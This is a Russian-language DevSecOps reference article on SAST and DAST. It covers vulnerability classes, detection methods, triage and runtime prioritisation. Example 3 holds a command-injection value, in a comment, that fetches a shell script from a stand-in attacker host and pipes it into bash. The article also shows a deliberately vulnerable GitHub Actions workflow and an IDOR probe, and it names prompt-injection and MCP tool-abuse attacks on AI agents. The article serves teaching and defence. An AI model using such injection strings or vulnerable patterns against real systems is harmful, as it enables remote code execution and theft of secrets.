# Уязвимости SAST и DAST

## Определения

Для обеспечения безопасности приложений (AppSec) в 2026 году используются интегрированные методы анализа, агрегируемые в рамках платформ **ASPM (Application Security Posture Management)**. Это позволяет коррелировать данные из различных источников для точной оценки рисков.

- **SAST (Static Application Security Testing):** анализ исходного кода, байт-кода и конфигураций без запуска приложения («белый ящик»). В 2026 году SAST активно использует LLM для **семантического анализа (Intent Analysis)**, что позволяет понимать логику разработчика и автоматически генерировать исправления (Auto-Remediation).
- **DAST (Dynamic Application Security Testing):** имитация атак на работающее приложение через его внешние интерфейсы («черный ящик»). Современный DAST реализуется через **автономных ИИ-агентов**, которые самостоятельно исследуют поверхность атаки и используют **OAST (Out-of-band)** для выявления «слепых» уязвимостей.
- **IAST (Interactive AST):** гибридный рантайм-анализ («серый ящик»). В 2026 году стандартом является использование **eBPF-инструментации**, которая позволяет отслеживать выполнение кода и системные вызовы на уровне ядра без изменения исходного кода приложения.
- **SCA (Software Composition Analysis):** анализ сторонних библиотек и зависимостей через динамические графы компонентов (**Living SBOM**). Подробнее: **[Анализ зависимостей и SBOM](../../Security/Supply_Chain_Security/dependency_and_sbom_analysis.md)**.

## Базовые концепции

### Уязвимости, обнаруживаемые SAST (2026)

Статический анализ фокусируется на **Data Flow** (потоках данных) и **Control Flow** (логике управления), выявляя дефекты до того, как код будет развернут.

**Характерные находки:**

- **Инъекции (Injections):**
  - **SQL / NoSQL Injection:** использование конкатенации строк вместо параметризованных запросов.
  - **OS Command Injection:** передача нефильтрованного ввода в функции типа `exec()` или `system()`.
  - **Prompt Injection (LLM01):** смешивание инструкций системы и данных пользователя в коде взаимодействия с LLM.
- **Цепочки атак на workflows (Cordyceps):** использование небезопасных событий (например, `pull_request_target`) и передача секретов в недоверенные шаги пайплайна.
- **Межсайтовый скриптинг (XSS):** отсутствие механизмов экранирования (escaping) в шаблонах Frontend-фреймворков.
- **Небезопасная десериализация:** использование уязвимых библиотек для обработки объектов, что ведет к удаленному исполнению кода (RCE).
- **Секреты и PII:** поиск паролей, токенов и персональных данных (PII) в коде, комментариях или IaC-манифестах.
- **AI Package Hallucination:** обнаружение зависимостей, которые были предложены ИИ-копилотами, но не существуют в официальных реестрах (риск захвата имен злоумышленниками).
- **Ошибки IaC (Infrastructure as Code):** небезопасные конфигурации Docker (запуск от root), Kubernetes (отсутствие Network Policies) и Terraform.

### Уязвимости, обнаруживаемые DAST (2026)

Динамический анализ выполняется автономными агентами, которые исследуют бизнес-логику и поведение приложения в реальном времени.

**Характерные находки:**

- **BOLA / IDOR (API01):** доступ к чужим объектам через манипуляцию ID в URL или теле запроса.
- **BFLA (Broken Function Level Authorization):** несанкционированный доступ к административным функциям API.
- **Prompt Injection (Runtime):** подтверждение эксплуатации уязвимостей LLM через имитацию действий пользователя и проверку реакции модели.
- **MCP Tool Abuse (2026):** попытки несанкционированного вызова инструментов (Tools), доступных ИИ-агенту через **Model Context Protocol**.
- **Слепые уязвимости (Blind SSRF / SQLi):** обнаружение через мониторинг внешних взаимодействий (DNS/HTTP коллбэки) на OAST-серверы.
- **Поведенческие аномалии:** выявление утечек больших объемов данных или аномального времени ответа, что указывает на логические ошибки.
- **Небезопасная конфигурация облачного периметра:** ошибки в заголовках CORS, CSP, HSTS и отсутствие защиты от DoS на уровне шлюза.

### Как SAST и DAST находят уязвимости (механизмы детектирования)

- **SAST — анализ потоков данных (Data-flow / Taint analysis):** сканер помечает *источники* (source) небезопасных данных (ввод пользователя, переменные окружения, параметры HTTP) и отслеживает их распространение через переменные и вызовы функций до *стоков* (sink) — опасных операций (`exec`, SQL-запрос, `eval`). Если данные достигают стока без санитайзера (sanitizer), генерируется находка. Дополнительно анализируется *Control Flow* (логика ветвлений) и структурные паттерны (небезопасные вызовы, слабые криптопримитивы). Подробнее о настройке инструментов — в **[SAST — обзор](./sast_overview.md)**.
- **DAST — имитация атаки (Crawling + Fuzzing + OAST):** инструмент обходит приложение (crawler строит карту URL/форм/API), подставляет в параметры *fuzz*-нагрузки (кавычки, спецсимволы, большие объёмы) и анализирует ответы (ошибки, stack trace, изменение состояния). Для «слепых» уязвимостей (Blind SSRF/SQLi) используется **OAST** — мониторинг исходящих DNS/HTTP-коллбэков на внешний сервер. Аутентификация (сессии, токены, API-ключи) воспроизводится через контекст сканирования. Подробнее — в **[DAST — обзор](./dast_overview.md)**.

### Расширенная классификация уязвимостей (OWASP Top 10 mapping)

Кроме перечисленных выше классов, SAST/DAST регулярно находят следующие категории (с указанием CWE и типичного метода детектирования):

| Категория (OWASP) | CWE | Что проверяется | SAST | DAST |
| :--- | :--- | :--- | :---: | :---: |
| **SSRF** (подделка запроса с сервера) | CWE-918 | исходящие запросы из пользовательского ввода (URL-фетчеры, вебхуки) | Да | Да (OAST) |
| **XXE** (внешние сущности XML) | CWE-611 | парсеры XML с включёнными внешними сущностями | Да | Редко |
| **Path Traversal** | CWE-22 | `../` в путях файловой системы | Да | Да |
| **CSRF** | CWE-352 | отсутствие anti-CSRF-токенов/заголовков | Да (по паттерну) | Частично |
| **Broken Authentication / Session** | CWE-287/613 | слабые сессии, отсутствие истечения, фиксация сессии | Да | Да |
| **Security Misconfiguration** | CWE-16 | дефолтные учётки, открытые порты, verbose errors | Да (IaC/конфиг) | Да |
| **Sensitive Data Exposure** | CWE-311/326 | слабая криптография, утечка данных в ответах/логах | Да | Да |
| **Improper Access Control** | CWE-284 | отсутствие проверки прав на уровне объекта/функции | Да | Да (BOLA/BFLA) |

Специфичные для ИИ/LLM классы (Prompt Injection, MCP Tool Abuse, AI Package Hallucination) описаны в разделе выше; углублённая работа с зависимостями и SBOM — в **[анализе зависимостей и SBOM](../../Security/Supply_Chain_Security/dependency_and_sbom_analysis.md)**, а защита от SQL-инъекций — в **[SQL Injection: принципы и защита](../../Security/ApplicationSecurity/sql_injection.md)**.

## Практические сценарии

### Пример 1: Атака Cordyceps (Workflow Escalation)

Уязвимость возникает при использовании привилегированного триггера `pull_request_target` с автоматическим чекаутом кода из внешнего PR.

```yaml
# Уязвимый workflow (GitHub Actions)
on:
  pull_request_target: # Имеет доступ к секретам репозитория

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }} # Код из PR атакующего
      - name: Run logic
        run: |
          npm install
          npm run build # Может содержать вредоносный код в package.json
```

**Обнаружение (SAST):** Сканер помечает комбинацию `pull_request_target` + `checkout` как **Critical**, так как это позволяет атакующему выполнить произвольный код с доступом к секретам.

### Пример 2: BOLA/IDOR в API (Detection via Autonomous DAST)

Атака на изменение идентификатора пользователя для получения конфиденциальной информации.

```http
# Запрос ИИ-агента DAST
GET /api/v1/user/profile/1001 HTTP/1.1
Authorization: Bearer <valid_token_for_user_1001>

# Автономный агент пробует манипуляцию
GET /api/v1/user/profile/1002 HTTP/1.1
Authorization: Bearer <valid_token_for_user_1001>
```

**Обнаружение (DAST):** Если сервер возвращает `200 OK` с данными пользователя `1002`, автономный агент фиксирует **BOLA** и автоматически генерирует Proof-of-Concept.

### Пример 3: Внедрение команд (Command Injection) в Python

```python
# Уязвимо: прямое использование ввода пользователя (SAST обнаружит Taint Flow)
host = request.args.get("host")
os.system("ping -c 1 " + host) 
# host = "8.8.8.8; curl attacker.com/shell | bash"
```

```python
# Безопасно: использование защищенных абстракций
host = request.args.get("host")
subprocess.run(["ping", "-c", "1", host], check=True)
# subprocess.run автоматически экранирует аргументы
```

### Пример 4: Триаж находки SAST (процесс верификации и принятия решения)

Технический запуск сканера описан в **[SAST — обзор](./sast_overview.md)** и **[SAST vs DAST](./sast_vs_dast.md)**. Здесь — операционный процесс обработки *конкретной* находки инженером/SRE.

**Предусловия:** SARIF-отчёт из CI (например, `gl-sast-report.sarif`), доступ к коду, Semgrep/GitLab установлены локально для воспроизведения.

**1. Воспроизвести находку локально и проверить контекст:**

```bash
# локально повторить тот же набор правил, что в CI
semgrep scan --config p/ci --sarif -o repro.sarif
# посмотреть конкретную находку по rule-id
jq -r '.runs[].results[] | select(.ruleId=="python.lang.security.audit.os-command-injection")' repro.sarif
```

**2. Принять решение (триаж-матрица):**

| Ситуация | Действие |
| :--- | :--- |
| Подтверждённый баг, есть фикс | Создать PR/issue, назначить владельцу, SLA по критичности |
| Ложное срабатывание (sanitizer есть, но не распознан) | Inline-исключение `// nosemgrep` *с обоснованием* или уточнить правило |
| Уязвимость недостижима в рантайме (VEX) | Выпустить VEX-аттестацию `not_affected` (см. Пример 6), не блокировать релиз |

**Validation:** находка либо устранена (re-scan зелёный), либо задокументирована (suppression/VEX) с обоснованием, видимым в ASPM/DefectDojo.

**Troubleshooting:**
- *Слишком много FP:* сузьте набор правил (`p/ci` вместо `p/default`), добавьте `.semgrepignore`; не отключайте сканер целиком.
- *Находка не воспроизводится локально:* сверьте версию правил/образа сканера между CI и локалью.

### Пример 5: DAST базовое сканирование OWASP ZAP (операционно, без облака)

Канонический self-hosted DAST-инструмент — **OWASP ZAP**. Пример фокусируется на операционных аспектах: аутентификация, область сканирования и обработка FP (базовый пример команд см. в **[SAST vs DAST](./sast_vs_dast.md)**).

**Предусловия:** запущенный staging-экземпляр приложения в периметре, Docker, валидный токен/сессия для авторизованного сканирования.

**1. Baseline-скан (быстрый, passive) в контейнере:**

```bash
docker run --rm -v "$(pwd)/zap:/zap/wrk" \
  ghcr.io/zaproxy/zaproxy:stable zap-baseline.py \
  -t https://staging.internal.corp \
  -r zap-report.html -J zap-report.json \
  -z "-config globalexcludeurl.filterList=.*/static/.*"
```

**2. Авторизованное сканирование API (передача токена):**

```bash
docker run --rm -v "$(pwd)/zap:/zap/wrk" \
  ghcr.io/zaproxy/zaproxy:stable zap-full-scan.py \
  -t https://staging.internal.corp/api \
  -H "Authorization: Bearer ${API_TOKEN}" \
  -r zap-api-report.html
```

**Validation:** отчёт содержит список алертов с уровнями риска; CI-шаг завершается ошибкой при превышении порога (`-l`/`--level`). Артефакты сохранены как CI-artifact.

**Troubleshooting:**
- *Много FP на static/assets:* исключите пути через `globalexcludeurl` или context.
- *Не проходит аутентификация:* используйте ZAP Context с форм-логином или передавайте свежий токен (для API — через `-H`); не коммитьте токен в репозиторий.
- *Таймауты на больших сайтах:* увеличьте `-m` (макс. время) и ограничьте область (context).

### Пример 6: Корреляция и приоритизация через достижимость (Reachability + runtime)

Обнаруженная уязвимость неравноценна эксплуатируемой. SRE/Sysadmin использует рантайм-сигнал, чтобы снизить приоритет недостижимого кода и поднять — активно эксплуатируемого.

**Предусловия:** eBPF-инструментация (Falco/Tetragon) на раннерах/подах, VEX-совместимый формат отчёта.

**1. Проверить, вызывается ли уязвимая функция в рантайме (Tetragon):**

```yaml
# trace-vuln.yaml — ловить вызов опасной функции в нужном бинаре
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "trace-os-system"
spec:
  kprobes:
  - call: "sys_execve"
    syscall: true
    args:
    - index: 0
      type: "string"
    selectors:
    - matchBinaries:
      - operator: "In"
        values: ["/usr/bin/app"]
```

```bash
kubectl apply -f trace-vuln.yaml
```

**2. Выпустить VEX-аттестацию для недостижимой уязвимости:**

```json
{
  "bomFormat": "CycloneDX",
  "vulnerabilities": [{
    "id": "CVE-2024-XXXX",
    "analysis": { "state": "not_affected",
                  "detail": "Уязвимый код не вызывается в рантайме (подтверждено eBPF/Tetragon)" }
  }]
}
```

**Validation:** VEX загружен в ASPM/DefectDojo; находка помечена `not_affected` и исключена из блокирующих; активно эксплуатируемая — эскалирована в on-call.

**Troubleshooting:**
- *Нет рантайм-сигнала:* если eBPF недоступен, используйте IAST-агент или статический анализ покрытия вызовов; при отсутствии данных — консервативно считайте уязвимость достижимой.
- *VEX не принимается платформой:* проверьте схему (CycloneDX/OpenVEX) и идентификатор компонента.

## Дополнительная информация

### Нюансы анализа и приоритизации

- **Reachability Analysis:** В 2026 году ключевым является подтверждение достижимости уязвимости. Если SAST нашел уязвимость в библиотеке, но IAST (eBPF) показывает, что уязвимая функция никогда не вызывается в рантайме, её приоритет снижается (VEX-аттестация).
- **False Positives Reduction:** Использование ИИ-валидации в SAST позволяет сократить количество ложных срабатываний на 80-90% за счет понимания контекста санитайзеров и проверок безопасности.
- **eBPF-наблюдаемость:** Позволяет обнаруживать эксплойты в реальном времени, фиксируя аномальные попытки чтения файлов (`/etc/passwd`) или сетевые соединения, инициированные легитимными процессами.

### Операционные рекомендации для DevOps/SRE/Sysadmin

- **Владение находками (Ownership):** каждая находка привязывается к владельцу сервиса (CODEOWNERS); без владельца находка не закрывается.
- **SLO триажа и MTTR:** критические — triage ≤ 24ч, fix ≤ 7 дней; высокие — triage ≤ 3 дней; метрики собираются в дашборде ASPM/DefectDojo.
- **Гейтинг в CI:** SAST/SCA запускаются на каждый MR (fail-fast), DAST — на staging по расписанию/после деплоя; блокировка релиза накладывается только на *подтверждённые* критические находки (через VEX/исключения с обоснованием).
- **Подавление (suppression) дисциплинированно:** inline-исключения (`nosemgrep`) и waivers только с обоснованием и сроком; периодический review подавлений, чтобы не накопить «тихие» уязвимости.
- **Корреляция с рантаймом:** сигналы eBPF (Falco/Tetragon) и IAST повышают приоритет реально эксплуатируемого; недостижимое — VEX (см. Пример 6).
- **Инцидент-респонс:** при обнаружении активной эксплуатации — эскалация в on-call, отзыв/ротация секретов, блокировка в WAF/API-шлюзе; см. **[Атаки на CI/CD](./cicd_attacks.md)**.
- **Метрики программы:** trend Findings (new/closed), coverage (какие репозитории сканируются), MTTR, % подавлений — для ретроспектив и бюджета на техдолг.
- **Связь с цепочкой поставок:** уязвимости зависимостей приоритизируются по наличию патча и достижимости (см. **[обзор безопасности цепочки поставок](../../Security/Supply_Chain_Security/overview.md)**).

### Чек-лист внедрения управления уязвимостями (DevSecOps)

1.  **SAST** подключён к каждому репозиторию и запускается на MR (fail-fast).
2.  **SCA + SBOM** генерируются в сборке; уязвимости зависимостей трекаются (см. анализ зависимостей и SBOM).
3.  **DAST** настроен на staging (ZAP baseline/active) с корректной аутентификацией и областью сканирования.
4.  **IAST/eBPF** (опционально) даёт рантайм-подтверждение достижимости.
5.  **VEX/исключения** оформляются только с обоснованием и сроком; подавления ревьюируются.
6.  **Гейтинг релиза** блокирует только подтверждённые критические находки.
7.  **Владение и SLO** назначены (CODEOWNERS, MTTR, дашборд).
8.  **Инцидент-респонс** для активной эксплуатации задокументирован и проверен.
